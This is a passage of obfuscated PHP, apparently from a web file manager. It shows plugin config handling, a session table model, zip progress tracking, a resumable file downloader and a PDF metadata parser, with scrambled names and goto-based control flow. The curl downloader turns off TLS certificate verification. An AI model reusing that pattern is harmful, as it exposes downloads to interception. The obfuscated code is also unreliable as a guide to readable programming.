$C‡İƒÃƒÊÖ = $this->loadList($D®¹–Å Ê); if ($C…õ·¶ìæõ) { Hook::apply($D®¹–Å Ê . $D¼éâÜÛ³Â[2204]); } $this->update($C‡İƒÃƒÊÖ[$D¼éâÜÛ³Â[367]], array($D¼éâÜÛ³Â[2205] => $C…õ·¶ìæõ)); } public function appRegist($eí‡ìïšÔÇ, $cËíˆŸÅ˜) { $E¹–ÎÀ…Õî =& $_SERVER[í™]; $Eª¸‚×œó» = $this->loadList($eí‡ìïšÔÇ); if ($Eª¸‚×œó») { $this->update($Eª¸‚×œó»[$E¹–ÎÀ…Õî[367]], array($E¹–ÎÀ…Õî[2199] => $cËíˆŸÅ˜)); } else { $eîŒ—È÷É = array($E¹–ÎÀ…Õî[28] => $eí‡ìïšÔÇ, $E¹–ÎÀ…Õî[2199] => $cËíˆŸÅ˜, $E¹–ÎÀ…Õî[671] => 0, $E¹–ÎÀ…Õî[6] => $this->getConfigDefault($eí‡ìïšÔÇ)); $this->insert($eîŒ—È÷É); } } public function getConfigDefault($aß‚„‰ÖàÉ) { $cİ¥áä¨Š =& $_SERVER[í™]; $cñ„éæ©Ñ• = array(); $FêÅÏê‡³‰ = $this->getPackageJson($aß‚„‰ÖàÉ); if (!$FêÅÏê‡³‰ && is_array($FêÅÏê‡³‰[$cİ¥áä¨Š[2206]])) { return $cñ„éæ©Ñ•; } foreach ($FêÅÏê‡³‰[$cİ¥áä¨Š[2206]] as $F£´š¥ßºÕ => $Aà­‡ ×†) { if (!isset($Aà­‡ ×†[$cİ¥áä¨Š[359]]) || isset($cñ„éæ©Ñ•[$F£´š¥ßºÕ])) { continue; } $cñ„éæ©Ñ•[$F£´š¥ßºÕ] = $Aà­‡ ×†[$cİ¥áä¨Š[359]]; } return $cñ„éæ©Ñ•; } public function getPackageJson($A°•ñã·‡Ÿ) { return Hook::apply($A°•ñã·‡Ÿ . $_SERVER[í™][2207]); } public function getConfig($a¾ïºïÙáã, $D¢ì¤ˆƒŠÅ = false) { $eÁê‹¦¥ =& $_SERVER[í™]; $DˆĞ„á’´… = array(); $CÛ÷Ò´‹Û = $this->loadList($a¾ïºïÙáã); if ($CÛ÷Ò´‹Û && is_array($CÛ÷Ò´‹Û[$eÁê‹¦¥[6]])) { $DˆĞ„á’´… = $CÛ÷Ò´‹Û[$eÁê‹¦¥[6]]; } if (!$DˆĞ„á’´… || $D¢ì¤ˆƒŠÅ) { $DˆĞ„á’´… = $this->getConfigDefault($a¾ïºïÙáã); } return $DˆĞ„á’´…; } public function setConfig($a­ºª‚…ÖÜ, $aÊèé¥Ãàá = false) { goto c®Îí˜Ì©Ì; c®Îí˜Ì©Ì: $Aåœë¼Ò« =& $_SERVER[í™]; $aÔŒŠ›à–„ = $this->loadList($a­ºª‚…ÖÜ); if (!$aÔŒŠ›à–„) { return !1; } goto fíÅºŠ”Ñš; FİÏèÉ…ª: $this->update($aÔŒŠ›à–„[$Aåœë¼Ò«[367]], array($Aåœë¼Ò«[6] => $c­†ù‚Ç‹)); goto d·ˆœŸÖÉ§; fíÅºŠ”Ñš: $c­†ù‚Ç‹ = $aÔŒŠ›à–„[$Aåœë¼Ò«[6]]; if ($aÊèé¥Ãàá == !1) { $c­†ù‚Ç‹ = array(); $aÊèé¥Ãàá = $this->getConfigDefault($a­ºª‚…ÖÜ); } foreach ($aÊèé¥Ãàá as $b¤©‡àğù => $e¶µ“¹‡³â) { $c­†ù‚Ç‹[$b¤©‡àğù] = is_string($e¶µ“¹‡³â) ? trim($e¶µ“¹‡³â) : $e¶µ“¹‡³â; } goto FİÏèÉ…ª; d·ˆœŸÖÉ§: } public function viewList() { goto B™©…²•ÜÌ; F©ó‰´¢Ö: return $d‚£ß‘‹ãŞ; goto BÜ«¤ˆ›¯ù; E¼ÓŒˆé‰ö: $dÄêòÌ¾¡ = $this->loadPluginList(); $d‚£ß‘‹ãŞ = array(); foreach ($dÄêòÌ¾¡ as $eİ›‚Ò› => $AîŸ¼˜Ÿ÷É) { unset($AîŸ¼˜Ÿ÷É[$eåÈ¹²¹Ñ›[2199]], $AîŸ¼˜Ÿ÷É[$eåÈ¹²¹Ñ›[6]]); $bíëğÈ”ŒË = PLUGIN_DIR . $AîŸ¼˜Ÿ÷É[$eåÈ¹²¹Ñ›[28]] . $eåÈ¹²¹Ñ›[2201]; if (!is_file($bíëğÈ”ŒË)) { continue; } $CƒÉ§è§İ­ = Hook::apply($AîŸ¼˜Ÿ÷É[$eåÈ¹²¹Ñ›[28]] . $eåÈ¹²¹Ñ›[2207]); if (is_array($CƒÉ§è§İ­)) { $d‚£ß‘‹ãŞ[$eİ›‚Ò›] = array_merge($AîŸ¼˜Ÿ÷É, $CƒÉ§è§İ­); } } goto F©ó‰´¢Ö; B™©…²•ÜÌ: $eåÈ¹²¹Ñ› =& $_SERVER[í™]; $dÄêòÌ¾¡ = $this->loadList(); $this->pluginScan($dÄêòÌ¾¡); goto E¼ÓŒˆé‰ö; BÜ«¤ˆ›¯ù: } private function loadPluginList() { $E°’ÄèÌÓ =& $_SERVER[í™]; $c¦¸Ş©ë¥ = $this->loadList(); if (strtolower(MOD) == $E°’ÄèÌÓ[2208]) { return $c¦¸Ş©ë¥; } $cè”±›°ğ = Hook::trigger($E°’ÄèÌÓ[2209], $c¦¸Ş©ë¥); if ($c¦¸Ş©ë¥ && !$cè”±›°ğ) { die; } return $cè”±›°ğ ? $cè”±›°ğ : $c¦¸Ş©ë¥; } private function pluginScan($dŒàÈ‚°‹‡) { $eàìÛŞâŸí =& $_SERVER[í™]; recursion_dir(PLUGIN_DIR, $Dîë“Àİğ£, $aßöÏ±‹Ó¤, 0); foreach ($Dîë“Àİğ£ as $C£‚ƒìÄÕ) { $bêÑĞˆ…È = get_path_this($C£‚ƒìÄÕ); if (isset($dŒàÈ‚°‹‡[$bêÑĞˆ…È]) || !file_exists($C£‚ƒìÄÕ . $eàìÛŞâŸí[2210]) || !file_exists($C£‚ƒìÄÕ . $eàìÛŞâŸí[2201])) { continue; } Hook::apply($bêÑĞˆ…È . $eàìÛŞâŸí[2204]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\171\x73\x74\145\155\137\x73\x65\163\x73\151\x6f\x6e"; public function get($FˆÂ§ø‹§›) { $A‘¸™¸‹ùó =& $_SERVER[í™]; $C´·Ÿ¥œçÁ = $this->where(array($A‘¸™¸‹ùó[2211] => $FˆÂ§ø‹§›))->find(); if (!is_array($C´·Ÿ¥œçÁ)) { return !1; } return $C´·Ÿ¥œçÁ[$A‘¸™¸‹ùó[674]]; } public function set($c‹—É´Ñ¶Ó, $fÄÜ†š§è, $A¸ÕèŸÃß = 3600) { $bçÌ¡„Ï¼ =& $_SERVER[í™]; $CÄİƒˆÚù‰ = array($bçÌ¡„Ï¼[2211] => $c‹—É´Ñ¶Ó, $bçÌ¡„Ï¼[2124] => $fÄÜ†š§è, $bçÌ¡„Ï¼[2212] => $A¸ÕèŸÃß + time()); if (Session::get($bçÌ¡„Ï¼[2213])) { $CÄİƒˆÚù‰[$bçÌ¡„Ï¼[1423]] = Session::get($bçÌ¡„Ï¼[2213]); } else { $CÄİƒˆÚù‰[$bçÌ¡„Ï¼[1423]] = 0; } if ($this->get($c‹—É´Ñ¶Ó)) { return $this->where(array($bçÌ¡„Ï¼[2211] => $c‹—É´Ñ¶Ó))->save($CÄİƒˆÚù‰); } else { return $this->add($CÄİƒˆÚù‰, array(), !0); } } public function remove($d„Ô¨«Ô‰) { return $this->where(array($_SERVER[í™][2211] => $d„Ô¨«Ô‰))->delete(); } public function clearTimeout() { return $this->where($_SERVER[í™][2214] . time())->delete(); } } goto d—¢—†§—™; DïƒŠÚ¨¦: class TaskZip extends TaskFileTransfer { protected function startAfter() { $A…‚¿Š‹ÂÅ =& $_SERVER[í™]; parent::startAfter(); Hook::bind($A…‚¿Š‹ÂÅ[1499], array($this, $A…‚¿Š‹ÂÅ[1494])); $aóÅãŠè§ =& $this->task; $aóÅãŠè§[$A…‚¿Š‹ÂÅ[1496]] = $A…‚¿Š‹ÂÅ[1026]; if (!$aóÅãŠè§[$A…‚¿Š‹ÂÅ[1328]]) { $aóÅãŠè§[$A…‚¿Š‹ÂÅ[1328]] = LNG($A…‚¿Š‹ÂÅ[1500]); } } protected function endAfter() { $e†’†ãö‡ƒ =& $_SERVER[í™]; parent::endAfter(); Hook::unbind($e†’†ãö‡ƒ[1499], array($this, $e†’†ãö‡ƒ[1494])); } public function updateAfter() { $fØâ½„êêë =& $_SERVER[í™]; $F×´Ûì°êÕ =& $this->task; if (!$F×´Ûì°êÕ[$fØâ½„êêë[962]] || !$F×´Ûì°êÕ[$fØâ½„êêë[680]]) { return; } if ($F×´Ûì°êÕ[$fØâ½„êêë[1496]] == $fØâ½„êêë[1026]) { $bïÉ•Èƒ‘ù = $F×´Ûì°êÕ[$fØâ½„êêë[1469]]; if ($F×´Ûì°êÕ[$fØâ½„êêë[1470]] != $fØâ½„êêë[1026]) { $bïÉ•Èƒ‘ù = 0; } $aµ¹ÎõªˆË = ($F×´Ûì°êÕ[$fØâ½„êêë[1473]] + $bïÉ•Èƒ‘ù) / $F×´Ûì°êÕ[$fØâ½„êêë[680]]; $F×´Ûì°êÕ[$fØâ½„êêë[1424]] = $aµ¹ÎõªˆË * 0.3; } else { if ($F×´Ûì°êÕ[$fØâ½„êêë[1496]] == $fØâ½„êêë[301]) { $aµ¹ÎõªˆË = $F×´Ûì°êÕ[$fØâ½„êêë[976]] / $F×´Ûì°êÕ[$fØâ½„êêë[962]]; $F×´Ûì°êÕ[$fØâ½„êêë[1424]] = 0.3 + $aµ¹ÎõªˆË * 0.5; } else { if ($F×´Ûì°êÕ[$fØâ½„êêë[1496]] == $fØâ½„êêë[103]) { $aµ¹ÎõªˆË = 0; if ($F×´Ûì°êÕ[$fØâ½„êêë[1468]]) { $aµ¹ÎõªˆË = $F×´Ûì°êÕ[$fØâ½„êêë[1469]] / $F×´Ûì°êÕ[$fØâ½„êêë[1468]]; } $F×´Ûì°êÕ[$fØâ½„êêë[1424]] = 0.3 + 0.5 + $aµ¹ÎõªˆË * 0.2; } } } if ($F×´Ûì°êÕ[$fØâ½„êêë[1424]] > 0) { $eôÈÁ••­ = timeFloat() - $F×´Ûì°êÕ[$fØâ½„êêë[1426]] - $F×´Ûì°êÕ[$fØâ½„êêë[1429]]; $F×´Ûì°êÕ[$fØâ½„êêë[1430]] = $eôÈÁ••­ * (1 - $F×´Ûì°êÕ[$fØâ½„êêë[1424]]) / $F×´Ûì°êÕ[$fØâ½„êêë[1424]]; } } public function copyFileStart($e÷öÚ÷ëËñ, $D÷ö¯è­¨Œ, $dŒË™ÔØÏº, $F¥ñäÎºõ‰, $B‡¾‘ùÑä, $bø—ÓÇ”ç™) { $Fà’Ä³‰íš =& $_SERVER[í™]; parent::copyFileStart($e÷öÚ÷ëËñ, $D÷ö¯è­¨Œ, $dŒË™ÔØÏº, $F¥ñäÎºõ‰, $B‡¾‘ùÑä, $bø—ÓÇ”ç™); $Bù‘î¨áÃ§ =& $this->task; if ($Bù‘î¨áÃ§[$Fà’Ä³‰íš[1496]] == $Fà’Ä³‰íš[301]) { $Bù‘î¨áÃ§[$Fà’Ä³‰íš[1496]] = $Fà’Ä³‰íš[103]; } $this->update(); } public function copyFileEnd($Cœ¬Ë¨â, $a İ¾ğ‰, $Eßµ¬µø£µ, $Dò¸šÓøÎ½, $båàñÕ§ÓÔ, $AÛ—§Ë»•ª) { $f…¡‹â°¬© =& $_SERVER[í™]; $EÕ¨ïô „ó =& $this->task; $EÕ¨ïô „ó[$f…¡‹â°¬©[1469]] = $EÕ¨ïô „ó[$f…¡‹â°¬©[1468]]; $EÕ¨ïô „ó[$f…¡‹â°¬©[1473]] += $EÕ¨ïô „ó[$f…¡‹â°¬©[1468]]; $EÕ¨ïô „ó[$f…¡‹â°¬©[1470]] = $f…¡‹â°¬©[33]; $this->update(); } public function nameParse($E´á™—¢¹) { $A å‰­Ãğª =& $_SERVER[í™]; $B¥æÈ¹© =& $this->task; if ($B¥æÈ¹©[$A å‰­Ãğª[976]] < $B¥æÈ¹©[$A å‰­Ãğª[962]]) { $a×Ï­åæ¬Å = get_path_this($E´á™—¢¹); if (strstr($a×Ï­åæ¬Å, $A å‰­Ãğª[91])) { $B¥æÈ¹©[$A å‰­Ãğª[976]] += 1; } } if ($B¥æÈ¹©[$A å‰­Ãğª[1496]] == $A å‰­Ãğª[1026]) { $B¥æÈ¹©[$A å‰­Ãğª[1496]] = $A å‰­Ãğª[301]; } $B¥æÈ¹©[$A å‰­Ãğª[1466]] = $E´á™—¢¹; $this->update(); } } class Downloader { static function start($EØŞ²‚ÖÖÉ, $a¯ØÓ–é”¶, $b˜î³ŒîÀÒ = 10) { goto b„«ÖÛßõª; b¯¨‡†äÜ: if (is_file($eÅ•ÔÁ§¬)) { $A‰¸—‡ªŸ½ = file_get_contents($eÅ•ÔÁ§¬); $C‚â¹Á†¾ = json_decode($A‰¸—‡ªŸ½, 1); } if (file_exists($a¯ØÓ–é”¶) && $bŠÂ‹»ÆåĞ == filesize($a¯ØÓ–é”¶)) { @unlink($dÔñ‹ÍîŠ); @unlink($eÅ•ÔÁ§¬); return array($aÕ¸šù‰‘[1018] => !0, $aÕ¸šù‰‘[1020] => $aÕ¸šù‰‘[1504]); } if ($C‚â¹Á†¾[$aÕ¸šù‰‘[325]] != $bŠÂ‹»ÆåĞ) { $C‚â¹Á†¾ = array($aÕ¸šù‰‘[325] => $bŠÂ‹»ÆåĞ); } goto cÑÎ½ò±; e¢ñ£ª‘Ñ‹: if ($b¸œ²Û‰â•[$aÕ¸šù‰‘[1018]]) { @unlink($eÅ•ÔÁ§¬); } return $b¸œ²Û‰â•; goto BøÂ¬öËÖÓ; EÖòÌŞ„Ò: $dÔñ‹ÍîŠ = $a¯ØÓ–é”¶ . $aÕ¸šù‰‘[1502]; if (is_array($EØŞ²‚ÖÖÉ)) { $e¾ëøğõ³Û = $EØŞ²‚ÖÖÉ; } else { $e¾ëøğõ³Û = url_header($EØŞ²‚ÖÖÉ); } $EØŞ²‚ÖÖÉ = $e¾ëøğõ³Û[$aÕ¸šù‰‘[295]]; goto c…Š™ãØÒî; b„«ÖÛßõª: $aÕ¸šù‰‘ =& $_SERVER[í™]; if (!request_url_safe($EØŞ²‚ÖÖÉ)) { return array($aÕ¸šù‰‘[1018] => !1, $aÕ¸šù‰‘[1020] => $aÕ¸šù‰‘[1023]); } $eÅ•ÔÁ§¬ = $a¯ØÓ–é”¶ . $aÕ¸šù‰‘[1501]; goto EÖòÌŞ„Ò; cÑÎ½ò±: if ($EÃò‰µã±• > $bŠÂ‹»ÆåĞ) { @unlink($dÔñ‹ÍîŠ); } file_put_contents($eÅ•ÔÁ§¬, json_encode($C‚â¹Á†¾)); $b¸œ²Û‰â• = self::fileDownloadCurl($EØŞ²‚ÖÖÉ, $a¯ØÓ–é”¶, !0, $EÃò‰µã±•, $bŠÂ‹»ÆåĞ); goto e¢ñ£ª‘Ñ‹; c…Š™ãØÒî: if (!$EØŞ²‚ÖÖÉ) { return array($aÕ¸šù‰‘[1018] => !1, $aÕ¸šù‰‘[1020] => $aÕ¸šù‰‘[1023]); } if (!$e¾ëøğõ³Û[$aÕ¸šù‰‘[1274]] || $e¾ëøğõ³Û[$aÕ¸šù‰‘[325]] == 0) { @unlink($dÔñ‹ÍîŠ); @unlink($a¯ØÓ–é”¶); $b¸œ²Û‰â• = self::fileDownloadFopen($EØŞ²‚ÖÖÉ, $a¯ØÓ–é”¶, $e¾ëøğõ³Û[$aÕ¸šù‰‘[325]]); if ($b¸œ²Û‰â•[$aÕ¸šù‰‘[1018]]) { return $b¸œ²Û‰â•; } else { @unlink($dÔñ‹ÍîŠ); @unlink($a¯ØÓ–é”¶); $b¸œ²Û‰â• = self::fileDownloadCurl($EØŞ²‚ÖÖÉ, $a¯ØÓ–é”¶, !1, 0, $e¾ëøğõ³Û[$aÕ¸šù‰‘[325]]); @unlink($dÔñ‹ÍîŠ); return $b¸œ²Û‰â•; } } $EÃò‰µã±• = is_file($dÔñ‹ÍîŠ) ? filesize($dÔñ‹ÍîŠ) : 0; goto bœÇ£™Ò; bœÇ£™Ò: $bŠÂ‹»ÆåĞ = intval($e¾ëøğõ³Û[$aÕ¸šù‰‘[325]]); if (file_exists($dÔñ‹ÍîŠ) && time() - filemtime($dÔñ‹ÍîŠ) < 3) { return array($aÕ¸šù‰‘[1018] => !1, $aÕ¸šù‰‘[1020] => $aÕ¸šù‰‘[1503]); } $C‚â¹Á†¾ = array(); goto b¯¨‡†äÜ; BøÂ¬öËÖÓ: } static function fileDownloadFopen($b¾™ŠÔ¼, $B¶áò›¼Ó§, $f—œ½×•‡° = 0) { $D»óÛœŒµ =& $_SERVER[í™]; @ini_set($D»óÛœŒµ[1505], $D»óÛœŒµ[1506]); $a™À‰å× = $B¶áò›¼Ó§ . $D»óÛœŒµ[1502]; set_timeout(); @unlink($a™À‰å×); if ($dÊª„ÑßÕ‚ = @fopen($b¾™ŠÔ¼, $D»óÛœŒµ[1507])) { goto aĞñøí‹×; e—Ó‰ƒ™³: return array($D»óÛœŒµ[1018] => !0, $D»óÛœŒµ[1020] => $D»óÛœŒµ[678]); goto A¯ƒ¸ÚÎ’Ü; aĞñøí‹×: if (!($C±ˆçÇš = @fopen($a™À‰å×, $D»óÛœŒµ[1508]))) { return array($D»óÛœŒµ[1018] => !1, $D»óÛœŒµ[1020] => $D»óÛœŒµ[1509]); } while (!feof($dÊª„ÑßÕ‚)) { if (!file_exists($a™À‰å×)) { fclose($C±ˆçÇš); return array($D»óÛœŒµ[1018] => !1, $D»óÛœŒµ[1020] => $D»óÛœŒµ[1510]); } clearstatcache(); if ($f—œ½×•‡° > 0 && $f—œ½×•‡° == filesize(iconv_system($a™À‰å×))) { break; } fwrite($C±ˆçÇš, fread($dÊª„ÑßÕ‚, 1024 * 8), 1024 * 8); } fclose($C±ˆçÇš); goto AÅ¹² ‡‘‡; AÅ¹² ‡‘‡: fclose($dÊª„ÑßÕ‚); self::checkGzip($a™À‰å×); if (!@rename($a™À‰å×, $B¶áò›¼Ó§)) { usleep(round(rand(0, 1000) * 50)); @unlink($B¶áò›¼Ó§); $e½µ¦Ùµ¤İ = @rename($a™À‰å×, $B¶áò›¼Ó§); if (!$e½µ¦Ùµ¤İ) { return array($D»óÛœŒµ[1018] => !1, $D»óÛœŒµ[1020] => $D»óÛœŒµ[1511]); } } goto e—Ó‰ƒ™³; A¯ƒ¸ÚÎ’Ü: } else { return array($D»óÛœŒµ[1018] => !1, $D»óÛœŒµ[1020] => $D»óÛœŒµ[1512]); } } static function fileDownloadCurl($cÕ‘İÛ¬”, $b•ºÖŠøØ, $dª®¬®ø«» = false, $e¿¡•Æµ·ç = 0, $D‚É×‹ ×¦ = 0) { goto F—ÌÑ–µ¶–; F—ÌÑ–µ¶–: $e·¹ˆ£Ôù¿ =& $_SERVER[í™]; $d„äØòËğ¥ = $b•ºÖŠøØ . $e·¹ˆ£Ôù¿[1502]; set_timeout(); goto C ›Û÷ŠÒÏ; EÛÇÉÏø: if ($dª®¬®ø«») { curl_setopt($eƒ™……‰ã, CURLOPT_RANGE, $e¿¡•Æµ·ç . $e·¹ˆ£Ôù¿[697]); } curl_setopt($eƒ™……‰ã, CURLOPT_FILE, $b»áå¦Å”Â); curl_setopt($eƒ™……‰ã, CURLOPT_REFERER, get_url_link($cÕ‘İÛ¬”)); goto Bòß‹›¹°¬; F¯ƒ¸†À: if ($EÏ‹·ÊÙ‰ < $D‚É×‹ ×¦ && $D‚É×‹ ×¦ != 0) { return array($e·¹ˆ£Ôù¿[1018] => !1, $e·¹ˆ£Ôù¿[1020] => $e·¹ˆ£Ôù¿[1503]); } if ($C©‰¸®³–ƒ && filesize($d„äØòËğ¥) != 0) { self::checkGzip($d„äØòËğ¥); if (!@rename($d„äØòËğ¥, $b•ºÖŠøØ)) { @unlink($b•ºÖŠøØ); $C©‰¸®³–ƒ = @rename($d„äØòËğ¥, $b•ºÖŠøØ); if (!$C©‰¸®³–ƒ) { return array($e·¹ˆ£Ôù¿[1018] => !1, $e·¹ˆ£Ôù¿[1020] => $e·¹ˆ£Ôù¿[1515]); } } return array($e·¹ˆ£Ôù¿[1018] => !0, $e·¹ˆ£Ôù¿[1020] => $e·¹ˆ£Ôù¿[678]); } return array($e·¹ˆ£Ôù¿[1018] => !1, $e·¹ˆ£Ôù¿[1020] => $e·¹ˆ£Ôù¿[1516]); goto b°¶è®ÕÜº; d „Á´Í›®: curl_close($eƒ™……‰ã); fclose($b»áå¦Å”Â); $EÏ‹·ÊÙ‰ = filesize(iconv_system($d„äØòËğ¥)); goto F¯ƒ¸†À; EæñõÚÛ©: curl_setopt($eƒ™……‰ã, CURLOPT_NOPROGRESS, !1); curl_setopt($eƒ™……‰ã, CURLOPT_PROGRESSFUNCTION, $e·¹ˆ£Ôù¿[1514]); curl_progress_start($eƒ™……‰ã); goto a¾¸¹ğÎÄ; Bòß‹›¹°¬: curl_setopt($eƒ™……‰ã, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($eƒ™……‰ã, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($eƒ™……‰ã, CURLOPT_SSL_VERIFYHOST, 0); goto EæñõÚÛ©; C ›Û÷ŠÒÏ: $b»áå¦Å”Â = @fopen($d„äØòËğ¥, $e·¹ˆ£Ôù¿[966]); if (!$b»áå¦Å”Â) { return array($e·¹ˆ£Ôù¿[1018] => !1, $e·¹ˆ£Ôù¿[1020] => $e·¹ˆ£Ôù¿[1513]); } $eƒ™……‰ã = curl_init($cÕ‘İÛ¬”); goto EÛÇÉÏø; a¾¸¹ğÎÄ: curl_setopt($eƒ™……‰ã, CURLOPT_USERAGENT, $e·¹ˆ£Ôù¿[1506]); $C©‰¸®³–ƒ = curl_exec($eƒ™……‰ã); curl_progress_end($eƒ™……‰ã); goto d „Á´Í›®; b°¶è®ÕÜº: } static function checkGzip($BÎ…±¤¹ñ) { goto eßƒ½ßÌÖ…; AÚËñÍé: ob_start(); readgzfile($BÎ…±¤¹ñ); $aÅ­˜ÍÄ¶É = ob_get_clean(); goto cšã†‘È; eßƒ½ßÌÖ…: $DÎ—äÎ°µÛ = $_SERVER[í™][1517]; $DÅ¹¬ó›‰ª = file_sub_str($BÎ…±¤¹ñ, 0, 2); if ($DÎ—äÎ°µÛ != $DÅ¹¬ó›‰ª) { return; } goto AÚËñÍé; cšã†‘È: file_put_contents($BÎ…±¤¹ñ, $aÅ­˜ÍÄ¶É); goto bâö®‚’ìö; bâö®‚’ìö: } } class FileParsePdf { public static function parse($a‡é‡æ×ôá) { goto dàºéğ§Ä; dÉØˆñ»£›: $BîİçåìÏó = $c½Ò°“¯Ù[1523]; preg_match($BîİçåìÏó, $E™¥±‡[$c½Ò°“¯Ù[1519]], $F¸‡³¡Å–); if (!$BÂ¨³‡¤­ä[$c½Ò°“¯Ù[1522]] && count($F¸‡³¡Å–) == 5) { $BÂ¨³‡¤­ä[$c½Ò°“¯Ù[1522]] = $F¸‡³¡Å–[3]; $BÂ¨³‡¤­ä[$c½Ò°“¯Ù[1524]] = $F¸‡³¡Å–[4]; } goto cÊÚ‚ÉÌ«£; dàºéğ§Ä: $c½Ò°“¯Ù =& $_SERVER[í™]; $C…««©÷Ãµ = 32 * 1024; $E™¥±‡ = array($c½Ò°“¯Ù[765] => fopen($a‡é‡æ×ôá, $c½Ò°“¯Ù[1156]), $c½Ò°“¯Ù[75] => $a‡é‡æ×ôá, $c½Ò°“¯Ù[77] => filesize($a‡é‡æ×ôá), $c½Ò°“¯Ù[1518] => $C…««©÷Ãµ); goto aÊÑÜùŒ¨“; fÃÚ±ÂÓ“²: if ($F¸‡³¡Å–) { $BÂ¨³‡¤­ä[$c½Ò°“¯Ù[1327]] = $F¸‡³¡Å–[1]; } $BÂ¨³‡¤­ä[$c½Ò°“¯Ù[1526]] = 0; $BîİçåìÏó = $c½Ò°“¯Ù[1527]; goto fÓ‘é„ó¶¶; aÊÑÜùŒ¨“: $E™¥±‡[$c½Ò°“¯Ù[1519]] = StreamWrapperIO::read($a‡é‡æ×ôá, 0, $C…««©÷Ãµ); $E™¥±‡[$c½Ò°“¯Ù[1520]] = StreamWrapperIO::read($a‡é‡æ×ôá, $E™¥±‡[$c½Ò°“¯Ù[77]] - $C…««©÷Ãµ, $C…««©÷Ãµ); $B±‰¤‘ëé = self::decodeXref($E™¥±‡); goto Cã‰ÑëçÁ; fÓ‘é„ó¶¶: preg_match_all($BîİçåìÏó, $E™¥±‡[$c½Ò°“¯Ù[1519]], $F¸‡³¡Å–); if ($F¸‡³¡Å–[1] && $BÂ¨³‡¤­ä[$c½Ò°“¯Ù[1526]] < $F¸‡³¡Å–[1][0]) { $BÂ¨³‡¤­ä[$c½Ò°“¯Ù[1526]] = $F¸‡³¡Å–[1][0]; } preg_match_all($BîİçåìÏó, $E™¥±‡[$c½Ò°“¯Ù[1520]], $F¸‡³¡Å–); goto Bİ†ô˜³ö; cÊÚ‚ÉÌ«£: preg_match($BîİçåìÏó, $E™¥±‡[$c½Ò°“¯Ù[1520]], $F¸‡³¡Å–); if (!$BÂ¨³‡¤­ä[$c½Ò°“¯Ù[1522]] && count($F¸‡³¡Å–) == 5) { $BÂ¨³‡¤­ä[$c½Ò°“¯Ù[1522]] = $F¸‡³¡Å–[3]; $BÂ¨³‡¤­ä[$c½Ò°“¯Ù[1524]] = $F¸‡³¡Å–[4]; } preg_match($c½Ò°“¯Ù[1525], $E™¥±‡[$c½Ò°“¯Ù[1519]], $F¸‡³¡Å–); goto fÃÚ±ÂÓ“²; Bİ†ô˜³ö: if ($F¸‡³¡Å–[1] && $BÂ¨³‡¤­ä[$c½Ò°“¯Ù[1526]] < $F¸‡³¡Å–[1][0]) { $BÂ¨³‡¤­ä[$c½Ò°“¯Ù[1526]] = $F¸‡³¡Å–[1][0]; } $BÂ¨³‡¤­ä = self::parseInfoItem($BÂ¨³‡¤­ä); return $BÂ¨³‡¤­ä; goto dĞ˜„¬ğƒõ; Cã‰ÑëçÁ: if ($B±‰¤‘ëé) { $Cøñ¯É—Ü = $B±‰¤‘ëé[$c½Ò°“¯Ù[1521]][$c½Ò°“¯Ù[1178]]; $BÂ¨³‡¤­ä = self::getObjectValue($E™¥±‡, $B±‰¤‘ëé, $Cøñ¯É—Ü); } $BÂ¨³‡¤­ä = is_array($BÂ¨³‡¤­ä) ? $BÂ¨³‡¤­ä : array(); $BÂ¨³‡¤­ä[$c½Ò°“¯Ù[1522]] = 0; goto dÉØˆñ»£›; dĞ˜„¬ğƒõ: } private static function parseInfoItem($aïåŠ×¤ê…) { $a»¬…è¯§† =& $_SERVER[í™]; if (!$aïåŠ×¤ê…) { return !1; } $Dæ –ÑÁŞ = array($a»¬…è¯§†[1328] => array($a»¬…è¯§†[1528], $a»¬…è¯§†[33]), $a»¬…è¯§†[1529] => array($a»¬…è¯§†[1530], $a»¬…è¯§†[33]), $a»¬…è¯§†[187] => array($a»¬…è¯§†[1531], $a»¬…è¯§†[210]), $a»¬…è¯§†[107] => array($a»¬…è¯§†[1532], $a»¬…è¯§†[210]), $a»¬…è¯§†[1526] => array($a»¬…è¯§†[1526], $a»¬…è¯§†[276]), $a»¬…è¯§†[1522] => array($a»¬…è¯§†[1522], $a»¬…è¯§†[276]), $a»¬…è¯§†[1524] => array($a»¬…è¯§†[1524], $a»¬…è¯§†[276]), $a»¬…è¯§†[1533] => array($a»¬…è¯§†[1534], $a»¬…è¯§†[33]), $a»¬…è¯§†[1535] => array($a»¬…è¯§†[1536], $a»¬…è¯§†[33]), $a»¬…è¯§†[1537] => array($a»¬…è¯§†[1327], $a»¬…è¯§†[33])); $A¢©¥¸Ú¥å = array(); foreach ($Dæ –ÑÁŞ as $BÊÍõÉË±« => $c†«˜õÒÊÌ) { if (!isset($aïåŠ×¤ê…[$c†«˜õÒÊÌ[0]])) { continue; } $FŸ‡Ó‘Í’ = $aïåŠ×¤ê…[$c†«˜õÒÊÌ[0]]; if (!$FŸ‡Ó‘Í’ || is_array($FŸ‡Ó‘Í’)) { continue; } switch ($c†«˜õÒÊÌ[1]) { case $a»¬…è¯§†[276]: $FŸ‡Ó‘Í’ = intval($FŸ‡Ó‘Í’); break; case $a»¬…è¯§†[210]: if (substr($FŸ‡Ó‘Í’, 0, 2) == $a»¬…è¯§†[1538]) { $FŸ‡Ó‘Í’ = substr($FŸ‡Ó‘Í’, 2, 14); } if (strtotime($FŸ‡Ó‘Í’)) { $FŸ‡Ó‘Í’ = date($a»¬…è¯§†[1539], strtotime($FŸ‡Ó‘Í’)); } break; } $A¢©¥¸Ú¥å[$BÊÍõÉË±«] = $FŸ‡Ó‘Í’; } return $A¢©¥¸Ú¥å; } private static function decodeXref(&$B Æß‘İ»á) { goto E£ğ‚¼öĞ¡; FÜåÆîÒ¯: if (preg_match($c‡Ç×âĞÃß[1552], $Fˆ’›£èÊ, $dªáĞï¯¨ˆ) > 0) { $a˜îí³[$c‡Ç×âĞÃß[1521]][$c‡Ç×âĞÃß[1178]] = intval($dªáĞï¯¨ˆ[1]) . $c‡Ç×âĞÃß[70] . intval($dªáĞï¯¨ˆ[2]); } if (preg_match($c‡Ç×âĞÃß[1553], $Fˆ’›£èÊ, $dªáĞï¯¨ˆ) > 0) { $a˜îí³[$c‡Ç×âĞÃß[1521]][$c‡Ç×âĞÃß[367]] = array(); $a˜îí³[$c‡Ç×âĞÃß[1521]][$c‡Ç×âĞÃß[367]][0] = $dªáĞï¯¨ˆ[1]; $a˜îí³[$c‡Ç×âĞÃß[1521]][$c‡Ç×âĞÃß[367]][1] = 